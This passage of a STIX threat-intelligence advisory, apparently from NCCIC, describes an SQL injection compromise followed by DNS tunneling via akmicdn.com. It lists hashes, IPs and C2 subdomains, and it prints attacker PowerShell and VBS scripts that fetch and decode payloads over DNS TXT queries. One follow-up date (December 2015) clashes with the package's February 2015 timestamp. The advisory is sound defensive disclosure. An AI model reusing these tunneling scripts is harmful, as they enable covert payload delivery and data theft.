<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AIS="http://www.us-cert.gov/STIXMarkingStructure#AISConsentMarking-2" xmlns:AddressObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:stix-ciq="http://stix.mitre.org/extensions/Identity#CIQIdentity3.0-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xal="urn:oasis:names:tc:ciq:xal:3" xmlns:xnl="urn:oasis:names:tc:ciq:xnl:3" xmlns:xpil="urn:oasis:names:tc:ciq:xpil:3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-15-10052A" timestamp="2015-02-26T15:05:57Z" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd      http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd     http://www.us-cert.gov/STIXMarkingStructure#AISConsentMarking-2 http://www.us-cert.gov/sites/default/files/STIX_Namespace/AIS_Bundle_Marking_1.1.1_v1.0.xsd     http://stix.mitre.org/extensions/Identity#CIQIdentity3.0-1 http://stix.mitre.org/XMLSchema/extensions/identity/ciq_3.0/1.1.1/ciq_3.0_identity.xsd     urn:oasis:names:tc:ciq:xpil:3 http://stix.mitre.org/XMLSchema/external/oasis_ciq_3.0/xPIL.xsd"><stix:STIX_Header><stix:Title>SQL Injection Attack Leads to DNS Tunneling Activity</stix:Title><stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent><stix:Description>This update was issued to correct the TLP designation.

On 01 Dec 2014, a DIB sector company reported a web server compromise. The attacker utilized SQL injection (SQLi) to pass hex encoded commands to the backend database. After various additional steps, DNS tunneling was achieved allowing the installation of additional tools as well as the exfiltration of data. DNS tunneling leveraged the domain akmicdn.com.</stix:Description><stix:Handling><marking:Marking><marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure><marking:Marking_Structure xsi:type="AIS:AISMarkingStructure"><AIS:Not_Proprietary CISA_Proprietary="false"><AIS:AISConsent consent="EVERYONE"/><AIS:TLPMarking color="AMBER"/></AIS:Not_Proprietary></marking:Marking_Structure><marking:Information_Source><stixCommon:Identity xsi:type="stix-ciq:CIQIdentity3.0InstanceType"><stix-ciq:Specification><xpil:PartyName><xnl:OrganisationName><xnl:NameElement>NCCIC</xnl:NameElement></xnl:OrganisationName></xpil:PartyName><xpil:Addresses><xpil:Address><xal:Country><xal:NameElement xal:NameCode="US" xal:NameCodeType="ISO 3166-1 alpha-2"/></xal:Country><xal:AdministrativeArea><xal:NameElement xal:NameCode="US-DC" xal:NameCodeType="ISO 3166-2"/></xal:AdministrativeArea></xpil:Address></xpil:Addresses><xpil:OrganisationInfo xpil:IndustryType="Information Technology Sector"/></stix-ciq:Specification></stixCommon:Identity></marking:Information_Source></marking:Marking></stix:Handling><stix:Information_Source><stixCommon:Time><cyboxCommon:Produced_Time>2015-02-26T15:05:57Z</cyboxCommon:Produced_Time></stixCommon:Time></stix:Information_Source></stix:STIX_Header><stix:Indicators><stix:Indicator id="CISCP:indicator-9b0f4962-d554-48c1-8383-f3be137d5f38" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Composite_Indicator_Expression operator="OR"><indicator:Indicator idref="CISCP:indicator-54166011-2b27-41ea-9d85-bfa97acadb71"/><indicator:Indicator idref="CISCP:indicator-7f9cb21c-fac9-41d0-9dfb-43777d8081b1"/><indicator:Indicator idref="CISCP:indicator-4ebb8dde-ef4d-4aef-9f22-325adaf6d683"/><indicator:Indicator idref="CISCP:indicator-b707217d-b687-44ae-b88c-fd4fb4b618a5"/><indicator:Indicator idref="CISCP:indicator-712979ac-24c9-4678-a458-5d456dd87536"/><indicator:Indicator idref="CISCP:indicator-76f82f7f-eb47-4c23-afb7-b988f50645c9"/><indicator:Indicator idref="CISCP:indicator-8eb0ce14-a9e5-4396-94f4-c818dd6ea402"/><indicator:Indicator idref="CISCP:indicator-cd38c993-b046-4012-b998-ec728a260fa6"/><indicator:Indicator idref="CISCP:indicator-00691daf-3376-450e-aa91-a089dcf06c95"/><indicator:Indicator idref="CISCP:indicator-d139c7e9-95ff-4c85-bfda-2c85b48cb88d"/><indicator:Indicator idref="CISCP:indicator-98756ca3-44b3-442a-9d87-d8619b49d080"/><indicator:Indicator idref="CISCP:indicator-2f94f9fd-cf8d-4718-97cb-530256b14ed9"/><indicator:Indicator idref="CISCP:indicator-875e57c0-5b74-4aaf-b3ec-49ab85671e7a"/><indicator:Indicator idref="CISCP:indicator-cb44b432-08bb-40f7-8c4e-331a90d96486"/><indicator:Indicator idref="CISCP:indicator-9436f298-8b60-4c11-af78-4b9913828977"/><indicator:Indicator idref="CISCP:indicator-3bfa0204-094b-480a-b027-5231dec0159c"/><indicator:Indicator idref="CISCP:indicator-94a85160-54d6-49fe-8940-030f8ff6ffd4"/><indicator:Indicator idref="CISCP:indicator-5cd0de53-3cad-4964-a656-342dc90030c8"/><indicator:Indicator idref="CISCP:indicator-8f3f36ef-7eee-4210-ba79-6034055954d3"/><indicator:Indicator idref="CISCP:indicator-0dc4e882-6e49-482a-a701-60dbd77af16c"/><indicator:Indicator idref="CISCP:indicator-8abcd5ae-28e2-48dc-afd6-950ade723892"/><indicator:Indicator idref="CISCP:indicator-6a10e8a8-0bd9-4eed-9ec4-2df2c69330e5"/><indicator:Indicator idref="CISCP:indicator-3a99d370-0999-44da-90ad-900a79f2b2a4"/><indicator:Indicator idref="CISCP:indicator-1c8e08f5-3a73-4e0e-a5eb-6ea2dece8e25"/><indicator:Indicator idref="CISCP:indicator-50e9a330-9784-40f0-ad8c-92bf9e5fdc25"/><indicator:Indicator idref="CISCP:indicator-6d30d470-1987-4198-82fc-a144451f2485"/><indicator:Indicator idref="CISCP:indicator-3eb1830a-ef39-426f-9a86-0b9a43ff6305"/><indicator:Indicator idref="CISCP:indicator-10afc43b-61fb-44f8-80d7-8d21142d3a53"/><indicator:Indicator idref="CISCP:indicator-109a19ee-5fd2-4232-b8d9-849dbe2a7541"/><indicator:Indicator idref="CISCP:indicator-e47fb342-dac9-40e9-ac44-e160f1d4642a"/><indicator:Indicator idref="CISCP:indicator-dc37c458-caee-46d8-bacf-13b55604d426"/><indicator:Indicator idref="CISCP:indicator-c2f27597-5670-466b-bf7a-214f2699a000"/><indicator:Indicator idref="CISCP:indicator-a8ecc7ca-0912-4855-b511-7804654d2a8c"/><indicator:Indicator idref="CISCP:indicator-d786bde9-613c-4f61-ab8a-01079d905ab5"/><indicator:Indicator idref="CISCP:indicator-35e67f93-b6b0-4a10-aeda-fb9a2f0a60bf"/></indicator:Composite_Indicator_Expression></stix:Indicator><stix:Indicator id="CISCP:indicator-54166011-2b27-41ea-9d85-bfa97acadb71" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This executable, an instance of Netcat 64-bit v1.2, was pulled from a subdomain of akmicdn.com using base64 encoded DNS TXT record responses in an attempt to communicate to 199.188.206.249 via various destination ports (81, 443, 80, and 445). The file was executed, but outbound rules within the network prevented communication from being successful.</indicator:Description><indicator:Observable id="CISCP:Observable-a97616f2-8a11-4b72-b5ad-9a20661ed8ac"><cybox:Object id="CISCP:Object-4a935f77-4238-42ff-838e-b5d32ba2e62a"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">kb15438.exe</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\temp\kb15438.exe</FileObj:File_Path><FileObj:Size_In_Bytes condition="Equals">45272</FileObj:Size_In_Bytes><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">523613A7B9DFA398CBD5EBD2DD0F4F38</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">3e92f697d642d68bb766cc93e3130b36b2da2bab</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">3e59379f585ebf0becb6b4e06d0fbbf806de28a4bb256e837b4555f1b4245571</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type><cyboxCommon:Fuzzy_Hash_Value condition="Equals">768:gaGHu/aKUAvRCXA/e6PfVVCJrxg/KKjMozd6jSemG0nf2Fcc5C+qLaVp:CuSzAvRCxmNVCgi+IjNmDO15C+qLaVp</cyboxCommon:Fuzzy_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-7f9cb21c-fac9-41d0-9dfb-43777d8081b1" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This executable, a Windows credential editor, was pulled from a subdomain of akmicdn.com using base64 encoded DNS TXT record responses, but failed to execute due to antivirus intervention.</indicator:Description><indicator:Observable id="CISCP:Observable-ce0da1f5-ccd8-4922-bdd5-e42f8aee3b06"><cybox:Object id="CISCP:Object-ed49a91a-2aa5-4f07-943d-b7cea61bf1e9"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">kb15438w.exe</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\temp\kb15438w.exe</FileObj:File_Path><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">382831FB8CF913A39A29D42508696ACB</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-4ebb8dde-ef4d-4aef-9f22-325adaf6d683" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This executable, a version of psexec.exe, was pulled from a subdomain of akmicdn.com using base64 encoded DNS TXT record responses, but no use execution of the file was observed.</indicator:Description><indicator:Observable id="CISCP:Observable-a4618de7-9b66-4fbd-9812-25052d811c91"><cybox:Object id="CISCP:Object-76b4666d-437f-4158-9f8f-6e04188b77cb"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">kb15438pe.exe</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\temp\kb15438pe.exe</FileObj:File_Path><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">A7F7A0F74C8B48F1699858B3B6C11EDA</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">b5c62d79eda4f7e4b60a9caa5736a3fdc2f1b27e</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">3b08535b4add194f5661e1131c8e81af373ca322cf669674cf1272095e5cab95</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type><cyboxCommon:Fuzzy_Hash_Value condition="Equals">6144:/FTsPtVBzQJLe1wm5wxszGaMtqGWU5RXMpS8fhkWLTFYoBQJl3u+sJ:9wPtV9a0wm5wxs6aMt3Qdfhkk/6K+2</cyboxCommon:Fuzzy_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-b707217d-b687-44ae-b88c-fd4fb4b618a5" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This PowerShell script appears to search for incoming base64 encoded DNS TXT responses, decodes them, and writes them to a reassembled file. 

It appears that this script was observed to have decoded and reassembled the test file "C:\temp\output" (MD5: 8400DC70A694C3C948171017250C4DC1) which contained the string "tessst"

The PowerShell script contents are as follows:

---- BEGIN CODE SNIPPET -----
Param([String]$s);$f=[IO.File]::OpenWrite('c:\temp\kb15437aa.txt');for($i=0;$i-ge0;$i++){$c=(Invoke-Expression "cmd.exe /C nslookup -type=TXT -ti=3 $i.$s")-join '';if($c.IndexOf('"')-ne-1){$p=$c.Substring(($c.IndexOf('"')+1),($c.LastIndexOf('"'))-($c.IndexOf('"')+1));$o=[Convert]::FromBase64String($p);$f.Write($o,0,$o.Length);}else{break}}$f.Close();
----- END CODE SNIPPET -----

After the commands executed on the server, their output was hex encoded and sent via DNS TXT requests to over 31,000 subdomains of akmicdn.com, which appears to be a domain masquerading as Akamai Technologies. The domain was registered in Panama, and, at the time of initial compromise, the domain resolved to both 199.188.206.249 and 209.188.18.220, with all observed DNS TXT responses set to a 127.0.0.1 local loopback.

The next stage of the attack was to pull various scripts and executables from the akmicdn.com subdomains in the form of base64 encoded DNS TXT responses, including various webshells and Netcat. Several executables were blocked from execution by the antivirus installed on the server, and outgoing Netcat traffic was blocked by firewall rules. 

After the initial compromise, the SOAP syntax was removed from the outward facing web page, input validation was added to the exploited login page, the calls were changed, and many were disabled or were reinforced with additional authentication tokens.

From 5 Dec 2015 to 22 Dec 2015, five additional attempts were made to compromise the server again.</indicator:Description><indicator:Observable id="CISCP:Observable-50c90013-b38c-4ee4-9e9b-d0aad22b04b7"><cybox:Object id="CISCP:Object-114ec933-d763-45ad-86b0-8b1403650f2c"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">cabarc2.ps1</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\temp\cabarc2.ps1</FileObj:File_Path><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">2B2EB910464D63B0EC4FD16A8CC458A5</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">7C65444E7823BDBE3D88A8D55F13F9A7A390ECB4</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">A0268E4989DE0F194C13D72E12AB1A78A4AD77B32EAB5077C99E8982625C3267</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-712979ac-24c9-4678-a458-5d456dd87536" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This visual basic script was encoded in incoming DNS TXT response packets, and appears to decode base64 encoded files that have been tunneled in to the compromised network.

Contained the following:
	Set objFSO = CreateObject("Scripting.FileSystemObject") 
	Set objFileIn = objFSO.GetFile(Wscript.Arguments(0)) 
	Set objStreamIn = objFileIn.OpenAsTextStream(1,0) 
	Set objXML = CreateObject("MSXml2.DOMDocument") 
	Set objDocElem = objXML.createElement("Base64Data") 
	objDocElem.DataType = "bin.base64" 
	objDocElem.text = objStreamIn.ReadAll() 
	Set objStream = CreateObject("ADODB.Stream") 
	objStream.Type = 1 
	objStream.Open() 
	objStream.Write objDocElem.NodeTypedValue 
	objStream.SaveToFile Wscript.Arguments(1),2</indicator:Description><indicator:Observable id="CISCP:Observable-04178a5e-d135-405a-8644-daf65c621690"><cybox:Object id="CISCP:Object-6eabd5bc-431b-4ebf-a3af-38ebb0d70c6c"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">b64decoder.vbs</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\documents and settings\[hostname]admin\local settings\temp\b64decoder.vbs</FileObj:File_Path><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">EE10C832950F043992FF8886CB01E700</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-76f82f7f-eb47-4c23-afb7-b988f50645c9" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This PowerShell script appears to attempt to search for incoming base64 encoded DNS TXT responses, decodes them, and writes them to a reassembled file. 

This script was the first unsuccessful attempt at creating this functionality on the victim network, just as kb2604121zmp.ps1 (MD5: 7D1EF091605D2C74B4481216604AC637) was on the second attempt. The files' contents were similar, which could mean the attacker was attempting to debug the script. The third PowerShell script uploaded was cabarc2.ps1 (MD5: 2B2EB910464D63B0EC4FD16A8CC458A5), which seemed to execute successfully.

The PowerShell script contents are as follows:
Param([String]$s)for($i=0;$i-ge0;$i++){$c=(Invoke-Expression "cmd.exe /C nslookup -type=TXT $($i).$($s)").ToString();if($Error.Count-ge1){$i=-10}$p+=$c.Substring(($c.IndexOf('"')+1),($c.LastIndexOf('"'))-($c.IndexOf('"')+1))}$o=[Convert]::FromBase64String($p);[IO.File]::WriteAllBytes('output',$o)</indicator:Description><indicator:Observable id="CISCP:Observable-86d71b28-4a67-4f1b-b935-625e9fadf269"><cybox:Object id="CISCP:Object-d60b1fcf-bb2a-4d6e-a249-4a9d2cde3207"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">kb2604121ymp.ps1</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\documents and settings\admin\local settings\temp\kb2604121ymp.ps1</FileObj:File_Path><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">A410486B936B9D3000D06E918C833B8E</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-8eb0ce14-a9e5-4396-94f4-c818dd6ea402" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type><indicator:Description>This PowerShell script appears to attempt to search for incoming base64 encoded DNS TXT responses, decodes them, and writes them to a reassembled file. 

It appears that this script was unsuccessful, just as kb2604121ymp.ps1 (MD5: A410486B936B9D3000D06E918C833B8E) was previously. The files' contents were similar, which could mean the attacker was attempting to debug the script. The next PowerShell script uploaded was cabarc2.ps1 (MD5: 2B2EB910464D63B0EC4FD16A8CC458A5), which seemed to execute successfully.

The PowerShell script contents are as follows:
Param([String]$s)for($i=0;$i-ge0;$i++){$c=(Invoke-Expression "cmd.exe /C nslookup -type=TXT $i.$s")[5];if($Error.Count-ge1){$i=-10}$p+=$c.Substring(($c.IndexOf('"')+1),($c.LastIndexOf('"'))-($c.IndexOf('"')+1))}$o=[Convert]::FromBase64String($p);[IO.File]::WriteAllBytes('C:\KB2604173',$o)</indicator:Description><indicator:Observable id="CISCP:Observable-d6c662ad-8724-4acc-955a-f27f4fe5ffb2"><cybox:Object id="CISCP:Object-72025615-a281-4421-aed3-102b3d3929bf"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name condition="Equals">kb2604121zmp.ps1</FileObj:File_Name><FileObj:File_Path condition="Equals">c:\documents and settings\admin\local settings\temp\kb2604121zmp.ps1</FileObj:File_Path><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value condition="Equals">7D1EF091605D2C74B4481216604AC637</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-cd38c993-b046-4012-b998-ec728a260fa6" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>DNS TXT requests/responses utilized in the tunneling communicated to over 31,000 subdomains of akmicdn.com. The domain is registered in Panama. At the time of initial compromise, the domain resolved to both 199.188.206.249 and 209.188.18.220.

Sample subdomains include:

ipconfig.txt.xm.akmicdn.com
Inetpub.xm.akmicdn.com
iisstart.htm.xm.akmicdn.com
2.txt.xm.akmicdn.com
C:WINDOWSsystem32.xm.akmicdn.com
1787.y.xm.akmicdn.com

It appears the subdomains were related to the filenames of files that were attempted to be exfiltrated (base64 encoded), or were the hex encoded output of commands run against the server, such as:

rUw60x4a0061006e002000200031002000310038003900390020003100.nxJ.xm.akmicdn.com
A DNS TXT request was made to the above subdomain, which is the value "Jan 1 1899 1" in Unicode and hex encoded.</indicator:Description><indicator:Observable id="CISCP:Observable-06ae3bca-0b1f-4bef-97c1-55fa0adf44ab"><cybox:Object id="CISCP:Object-baa1394f-dfae-4a93-bfc3-44fd9538133d"><cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">akmicdn.com</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-01T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator 